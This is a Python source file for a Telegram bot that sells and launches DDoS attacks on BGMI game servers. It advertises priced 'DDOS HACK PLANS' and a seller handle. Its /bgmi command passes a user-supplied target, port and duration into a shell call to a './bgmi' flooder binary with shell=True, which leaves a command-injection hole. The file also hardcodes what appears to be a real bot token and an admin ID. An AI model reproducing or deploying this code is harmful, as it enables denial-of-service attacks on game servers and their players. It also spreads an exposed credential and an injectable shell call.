import telebot
import subprocess
import requests
import datetime
import os

# insert your Telegram bot token here
bot = telebot.TeleBot('6800276514:AAEnutjpJl8Hyfe4FPAfVjdYJcB_yZuKzwU')

# Admin user IDs
admin_id = ["7028472133"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"


# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file


# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")


# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found ❌."
            else:
                file.truncate(0)
                response = "Logs cleared successfully ✅"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"User {user_to_add} Added Successfully 👍."
            else:
                response = "User already exists 🤦‍♂️."
        else:
            response = "Please specify a user ID to add 😒."
    else:
        response = "𝗢𝗻𝗹𝘆 𝗔𝗱𝗺𝗶𝗻 𝗖𝗮𝗻 𝗥𝘂𝗻 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 😡."

    bot.reply_to(message, response)



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully 👍."
            else:
                response = f"User {user_to_remove} not found in the list ❌."
        else:
            response = '''Please Specify A User ID to Remove. 
✅ Usage: /remove <userid>'''
    else:
        response = "𝗢𝗻𝗹𝘆 𝗔𝗱𝗺𝗶𝗻 𝗖𝗮𝗻 𝗥𝘂𝗻 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 😡."

    bot.reply_to(message, response)


@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found ❌."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully ✅"
        except FileNotFoundError:
            response = "Logs are already cleared ❌."
    else:
        response = "𝗢𝗻𝗹𝘆 𝗔𝗱𝗺𝗶𝗻 𝗖𝗮𝗻 𝗥𝘂𝗻 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 😡."
    bot.reply_to(message, response)

 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found ❌"
        except FileNotFoundError:
            response = "No data found ❌"
    else:
        response = "𝗢𝗻𝗹𝘆 𝗔𝗱𝗺𝗶𝗻 𝗖𝗮𝗻 𝗥𝘂𝗻 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 😡."
    bot.reply_to(message, response)


@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found ❌."
                bot.reply_to(message, response)
        else:
            response = "No data found ❌"
            bot.reply_to(message, response)
    else:
        response = "𝗢𝗻𝗹𝘆 𝗔𝗱𝗺𝗶𝗻 𝗖𝗮𝗻 𝗥𝘂𝗻 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 😡."
        bot.reply_to(message, response)


@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"🤖Your ID: {user_id}"
    bot.reply_to(message, response)

# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: VIP-UDP-BGMI"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =60

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 0:
                response = "You Are On Cooldown ❌. Please Wait 3min Before Running The /bgmi Command Again."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert time to integer
            time = int(command[3])  # Convert port to integer
            if time > 241:
                response = "Error: Time interval must be less than 240."
            else:
                record_command_logs(user_id, 'bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./bgmi {target} {port} {time} 200"
                subprocess.run(full_command, shell=True)
                response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
        else:
            response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
    else:
        response = """❌ 𝗬𝗼𝘂 𝗔𝗿𝗲 𝗡𝗼𝘁 𝗔𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝗧𝗼 𝗨𝘀𝗲 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 ❌.
        
 🛒 𝗣𝗹𝗲𝗮𝘀𝗲 𝗕𝘂𝘆 𝗙𝗿𝗼𝗺 @JODxPREDATOR"""

    bot.reply_to(message, response)



# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "❌ No Command Logs Found For You ❌."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "𝗬𝗼𝘂 𝗔𝗿𝗲 𝗡𝗼𝘁 𝗔𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝗧𝗼 𝗨𝘀𝗲 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 😡."

    bot.reply_to(message, response)


@bot.message_handler(commands=['attack'])
def show_help(message):
    help_text ='''🤖 𝘼𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙𝙨:
🚀 /bgmi : 𝗠𝗲𝘁𝗵𝗼𝗱 𝗙𝗼𝗿 𝗕𝗴𝗺𝗶 𝗦𝗲𝗿𝘃𝗲𝗿𝘀. 
🚀 /rules : 𝗣𝗹𝗲𝗮𝘀𝗲 𝗖𝗵𝗲𝗰𝗸 𝗕𝗲𝗳𝗼𝗿𝗲 𝗨𝘀𝗲 !!.
🚀 /mylogs : 𝗧𝗼 𝗖𝗵𝗲𝗰𝗸 𝗬𝗼𝘂𝗿 𝗥𝗲𝗰𝗲𝗻𝘁𝘀 𝗔𝘁𝘁𝗮𝗰𝗸𝘀.
🚀 /plan : 𝗖𝗵𝗲𝗰𝗸𝗼𝘂𝘁 𝗢𝘂𝗿 𝗗𝗗𝗼𝗦 𝗥𝗮𝘁𝗲𝘀.

🤖 𝗔𝗱𝗺𝗶𝗻 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀:
💥 /admincmd : 𝗦𝗵𝗼𝘄𝘀 𝗔𝗹𝗹 𝗔𝗱𝗺𝗶𝗻 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀.

🚀 𝗕𝘂𝘆 𝗙𝗿𝗼𝗺 :- @JODxPREDATOR
🚀 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 :- https://t.me/+qPTZFbsHXcpmZTY1
'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/attack'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''𝙃𝙚𝙡𝙡𝙤 𝙬𝙚𝙡𝙘𝙤𝙢𝙚 𝙩𝙤 𝘿𝘿𝙊𝙎𝙭𝙋𝙍𝙀𝘿𝘼𝙏𝙊𝙍💀🔥
    
 /attack 𝙏𝙤 𝙪𝙨𝙚 𝙗𝙤𝙩 ✅'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} 𝙋𝙡𝙚𝙖𝙨𝙚 𝙁𝙤𝙡𝙡𝙤𝙬 𝙏𝙝𝙚𝙨𝙚 𝙍𝙪𝙡𝙚𝙨 ⚠️:

1. 𝗗𝗼𝗻𝘁 𝗥𝘂𝗻 𝗧𝗼𝗼 𝗠𝗮𝗻𝘆 𝗔𝘁𝘁𝗮𝗰𝗸𝘀 !! 𝗖𝗮𝘂𝘀𝗲 𝗔 𝗕𝗮𝗻 𝗙𝗿𝗼𝗺 𝗕𝗼𝘁!'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, 𝙊𝙪𝙧 𝘽𝙜𝙢𝙞 𝘿𝙙𝙤𝙨 𝙋𝙡𝙖𝙣𝙨:


𝗕𝗚𝗠𝗜 𝗗𝗗𝗢𝗦 𝗛𝗔𝗖𝗞 𝗣𝗟𝗔𝗡𝗦
1 𝗱𝗮𝘆 = 180𝗿𝘀 [ 240𝘀𝗲𝗰 ] 
2 𝗱𝗮𝘆 = 280𝗿𝘀 [ 240𝘀𝗲𝗰 ]
3 𝗱𝗮𝘆 = 370𝗿𝘀 [ 240𝘀𝗲𝗰 ]
4 𝗱𝗮𝘆 = 800𝗿𝘀 [ 240𝘀𝗲𝗰 ]
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, 𝘼𝙙𝙢𝙞𝙣 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙨 𝘼𝙧𝙚 𝙃𝙚𝙧𝙚!!:

💥 /add <userId> : Add a User.
💥 /remove <userid> Remove a User.
💥 /allusers : Authorized Users Lists.
💥 /logs : All Users Logs.
💥 /broadcast : Broadcast a Message.
💥 /clearlogs : Clear The Logs File.
'''
    bot.reply_to(message, response)


@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "⚠️ Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users 👍."
        else:
            response = "🤖 Please Provide A Message To Broadcast."
    else:
        response = "𝗢𝗻𝗹𝘆 𝗔𝗱𝗺𝗶𝗻 𝗖𝗮𝗻 𝗥𝘂𝗻 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 😡."

    bot.reply_to(message, response)




if __name__ == "__main__":
    while True:
        try:
            bot.polling(none_stop=True)
        except requests.exceptions.ReadTimeout:
            print("Request timed out. Trying again...")
        except Exception as e:
            print(f"An unexpected error occurred: {e}")
            time.sleep(1)  # wait for 1 second before restarting bot polling to avoid flooding
